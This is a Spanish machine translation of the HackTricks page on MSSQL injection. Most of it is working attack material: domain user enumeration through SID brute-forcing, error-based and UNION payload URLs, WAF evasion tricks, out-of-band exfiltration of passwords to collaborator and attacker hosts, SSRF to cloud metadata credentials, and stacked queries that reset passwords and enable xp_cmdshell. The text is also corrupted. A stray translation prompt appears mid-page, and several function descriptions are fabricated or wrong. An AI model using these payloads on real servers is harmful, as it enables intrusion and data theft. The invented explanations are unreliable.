# Inyecci√≥n de MSSQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Enumeraci√≥n de Active Directory

Es posible **enumerar usuarios de dominio a trav√©s de una inyecci√≥n SQL dentro de un servidor MSSQL** utilizando las siguientes funciones de MSSQL:

* **`SELECT DEFAULT_DOMAIN()`**: Obtiene el nombre de dominio actual.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMINIO\Administrador'))`**: Si conoces el nombre del dominio (_DOMINIO_ en este ejemplo), esta funci√≥n devolver√° el **SID del usuario Administrador** en formato hexadecimal. Esto se ver√° como `0x01050000000[...]0000f401`, nota c√≥mo los **√∫ltimos 4 bytes** son el n√∫mero **500** en formato **big endian**, que es el **ID com√∫n del usuario administrador**.\
Esta funci√≥n te permitir√° **conocer el ID del dominio** (todos los bytes excepto los √∫ltimos 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Esta funci√≥n devolver√° el **nombre de usuario del ID indicado** (si existe), en este caso **0000e803** en big endian == **1000** (normalmente este es el ID del primer usuario regular creado). Luego puedes imaginar que puedes probar fuerza bruta en los IDs de usuario desde 1000 hasta 2000 y probablemente obtener todos los nombres de usuario de los usuarios del dominio. Por ejemplo, utilizando una funci√≥n como la siguiente:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Vectores alternativos basados en errores**

Las inyecciones SQL basadas en errores suelen tener construcciones como `+AND+1=@@version--` y variantes basadas en el operador ¬´OR¬ª. Las consultas que contienen estas expresiones suelen ser bloqueadas por los WAFs. Como m√©todo de bypass, concatena una cadena utilizando el car√°cter %2b con el resultado de llamadas a funciones espec√≠ficas que desencadenen un error de conversi√≥n de tipo de datos en los datos buscados.

Algunos ejemplos de estas funciones son:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Ejemplo de uso de la funci√≥n `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

### `fn_xe_file_target_read_file`

La funci√≥n `fn_xe_file_target_read_file` es vulnerable a una inyecci√≥n de SQL en Microsoft SQL Server. Esta vulnerabilidad permite a un atacante leer archivos arbitrarios en el sistema de archivos del servidor.

#### Descripci√≥n

La funci√≥n `fn_xe_file_target_read_file` se utiliza para leer archivos de destino en el servidor de Microsoft SQL Server. Sin embargo, no se realizan controles adecuados en los par√°metros de entrada, lo que permite a un atacante manipular la consulta SQL y leer archivos arbitrarios en el sistema de archivos del servidor.

#### Impacto

Un atacante puede aprovechar esta vulnerabilidad para leer archivos confidenciales en el sistema de archivos del servidor. Esto puede incluir archivos de configuraci√≥n, archivos de registro y otros archivos sensibles que contengan informaci√≥n confidencial.

#### Ejemplo de explotaci√≥n

El siguiente ejemplo muestra c√≥mo un atacante puede aprovechar la vulnerabilidad de inyecci√≥n de SQL en `fn_xe_file_target_read_file` para leer el archivo `C:\Windows\win.ini` en el sistema de archivos del servidor:

```
DECLARE @fileContent NVARCHAR(MAX);
DECLARE @filePath NVARCHAR(4000) = 'C:\Windows\win.ini';
EXECUTE sys.fn_xe_file_target_read_file(@filePath, @fileContent) ;
SELECT @fileContent;
```

En este ejemplo, el atacante manipula el par√°metro `@filePath` para leer el archivo `C:\Windows\win.ini`. El contenido del archivo se almacena en la variable `@fileContent` y se muestra en la consulta SELECT.

#### Recomendaciones

Para mitigar esta vulnerabilidad, se recomienda seguir las siguientes recomendaciones:

- Aplicar las actualizaciones y parches de seguridad m√°s recientes para Microsoft SQL Server.
- Validar y sanitizar adecuadamente los par√°metros de entrada antes de utilizarlos en consultas SQL.
- Limitar los privilegios de acceso de las cuentas de usuario utilizadas por las aplicaciones a los recursos m√≠nimos necesarios.
- Implementar un firewall de aplicaciones web para filtrar y bloquear las solicitudes maliciosas.
- Realizar pruebas de penetraci√≥n regulares para identificar y remediar las vulnerabilidades en el sistema.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**Permisos:** Requiere permiso de **`VIEW SERVER STATE`** en el servidor.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

La funci√≥n `fn_get_audit_file` es una funci√≥n en Microsoft SQL Server que se utiliza para obtener informaci√≥n de auditor√≠a de archivos. Esta funci√≥n se utiliza com√∫nmente en aplicaciones web para registrar eventos de auditor√≠a relacionados con archivos.

La funci√≥n acepta par√°metros como el nombre del archivo, la fecha de inicio y la fecha de fin, y devuelve informaci√≥n detallada sobre los eventos de auditor√≠a que ocurrieron en el archivo durante ese per√≠odo de tiempo.

Es importante tener en cuenta que esta funci√≥n puede ser vulnerable a ataques de inyecci√≥n SQL si no se implementan adecuadas medidas de seguridad. Los atacantes pueden aprovechar esta vulnerabilidad para ejecutar comandos maliciosos en el servidor de base de datos y obtener acceso no autorizado a la informaci√≥n confidencial.

Para protegerse contra ataques de inyecci√≥n SQL, es recomendable utilizar consultas parametrizadas o procedimientos almacenados en lugar de concatenar directamente los valores de los par√°metros en la consulta SQL. Adem√°s, es importante validar y sanitizar los datos de entrada para evitar la ejecuci√≥n de comandos no deseados.

En resumen, la funci√≥n `fn_get_audit_file` es una herramienta √∫til para obtener informaci√≥n de auditor√≠a de archivos en Microsoft SQL Server, pero es importante implementar medidas de seguridad adecuadas para protegerse contra ataques de inyecci√≥n SQL.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**Permisos:** Requiere el permiso **`CONTROL SERVER`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

La funci√≥n `fn_trace_gettabe` es una funci√≥n interna de Microsoft SQL Server que se utiliza para obtener informaci√≥n de seguimiento de eventos de traza. Esta funci√≥n se utiliza com√∫nmente en el contexto de la inyecci√≥n de SQL para obtener informaci√≥n confidencial de la base de datos.

La funci√≥n `fn_trace_gettabe` acepta dos par√°metros: `@traceid` y `@options`. El par√°metro `@traceid` especifica el identificador de la traza de eventos de la que se desea obtener informaci√≥n, mientras que el par√°metro `@options` especifica las opciones de filtrado para la informaci√≥n de seguimiento.

Es importante tener en cuenta que el uso de la funci√≥n `fn_trace_gettabe` en una inyecci√≥n de SQL puede ser peligroso, ya que puede revelar informaci√≥n confidencial de la base de datos, como nombres de tablas, columnas y datos sensibles. Por lo tanto, es fundamental asegurarse de que las consultas SQL sean seguras y est√©n debidamente protegidas contra la inyecci√≥n de SQL.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**Permisos:** Requiere el permiso **`CONTROL SERVER`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

El m√©todo m√°s com√∫n para realizar una llamada de red que te encontrar√°s al usar MSSQL es el uso del Procedimiento Almacenado `xp_dirtree`, que curiosamente no est√° documentado por Microsoft, lo que ha llevado a que sea [documentado por otras personas en Internet](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/). Este m√©todo se ha utilizado en [m√∫ltiples ejemplos](https://www.notsosecure.com/oob-exploitation-cheatsheet/) de publicaciones de [Exfiltraci√≥n de Datos Fuera de Banda](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) en Internet.

B√°sicamente,
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
Al igual que `LOAD_FILE` de MySQL, puedes usar `xp_dirtree` para hacer una solicitud de red solo al puerto TCP 445. No puedes controlar el n√∫mero de puerto, pero puedes leer informaci√≥n de recursos compartidos de red.

**PD:** Esto no funciona en `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` que se ejecuta en un `Windows Server 2016 Datacenter` en la configuraci√≥n predeterminada.

Existen **otros** procedimientos almacenados como [**`master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) o **`xp_subdirs`** que se pueden utilizar para obtener resultados similares.

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

Obviamente, tambi√©n puedes usar **`xp_cmdshell`** para **ejecutar** algo que desencadene un **SSRF**. Para obtener m√°s informaci√≥n, **lee la secci√≥n relevante** en la p√°gina:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### Funci√≥n definida por el usuario de MSSQL - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Es bastante sencillo escribir una **UDF CLR** (Funci√≥n definida por el usuario de tiempo de ejecuci√≥n com√∫n - c√≥digo escrito con cualquiera de los lenguajes **.NET** y compilado en un **DLL**) y **cargarlo dentro de MSSQL para funciones personalizadas**. Sin embargo, esto **requiere acceso `dbo`** y puede que no funcione a menos que la conexi√≥n de la aplicaci√≥n web a la base de datos sea **como `sa` o un rol de administrador**.

[Este repositorio de Github tiene el proyecto de Visual Studio y las instrucciones de instalaci√≥n](https://github.com/infiniteloopltd/SQLHttp) para cargar el binario en MSSQL como un ensamblado CLR y luego invocar solicitudes GET HTTP desde MSSQL.

[El c√≥digo `http.cs` utiliza la clase `WebClient` para hacer una solicitud GET y obtener el contenido](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) seg√∫n se especifica.
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
En las instrucciones de instalaci√≥n, ejecuta lo siguiente antes de la consulta `CREATE ASSEMBLY` para agregar el hash SHA512 de la assembly a la lista de assemblies confiables en el servidor (puedes ver la lista usando `select * from sys.trusted_assemblies;`)
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Una vez que se haya agregado el ensamblado y creado la funci√≥n, podemos ejecutar lo siguiente para realizar nuestras solicitudes HTTP.
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/15.png)

## **Explotaci√≥n r√°pida: Obtener una tabla completa en una sola consulta**

Existen dos formas sencillas de obtener el contenido completo de una tabla en una sola consulta: el uso de la cl√°usula FOR XML o la cl√°usula FOR JSON. La cl√°usula FOR XML requiere un modo especificado como "raw", por lo que en t√©rminos de brevedad FOR JSON es m√°s eficiente.

La consulta para obtener el esquema, las tablas y las columnas de la base de datos actual:
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

Los vectores basados en errores necesitan un alias o un nombre, ya que la salida de las expresiones sin ninguno de ellos no se puede formatear como JSON.
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **Recuperando la consulta actual**

La consulta SQL actual que se est√° ejecutando se puede recuperar desde el acceso `sys.dm_exec_requests` y `sys.dm_exec_sql_text`:
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

**Permisos:** Si el usuario tiene permisos de VIEW SERVER STATE en el servidor, el usuario ver√° todas las sesiones en ejecuci√≥n en la instancia de SQL Server; de lo contrario, el usuario solo ver√° la sesi√≥n actual.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **Peque√±os trucos para evadir WAF**

Caracteres de espacio en blanco no est√°ndar: %C2%85 o %C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
Notaci√≥n cient√≠fica (0e) y notaci√≥n hexadecimal (0x) para ofuscar UNION:
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
Un punto en lugar de un espacio en blanco entre FROM y el nombre de una columna:
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
\N separador entre SELECT y una columna desechable:
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### Bypass de WAF con consultas apiladas no convencionales

Seg√∫n [**esta publicaci√≥n de blog**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) es posible apilar consultas en MSSQL sin usar ";":

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Entonces, por ejemplo, m√∫ltiples consultas como:
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
El siguiente contenido es de un libro de hacking sobre t√©cnicas de hacking. El siguiente contenido es del archivo pentesting-web/sql-injection/mssql-injection.md. Traduzca el texto relevante al espa√±ol y devuelva la traducci√≥n manteniendo exactamente la misma sintaxis de markdown y html. No traduzca cosas como c√≥digo, nombres de t√©cnicas de hacking, palabras de hacking, nombres de plataformas en la nube/SaaS (como Workspace, aws, gcp...), la palabra 'leak', pentesting y etiquetas de markdown. Tampoco agregue nada aparte de la traducci√≥n y la sintaxis de markdown.
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
Por lo tanto, podr√≠a ser posible evadir diferentes WAFs que no consideran esta forma de apilar consultas. Por ejemplo:
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## Referencias

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#MSSQL](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#MSSQL)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
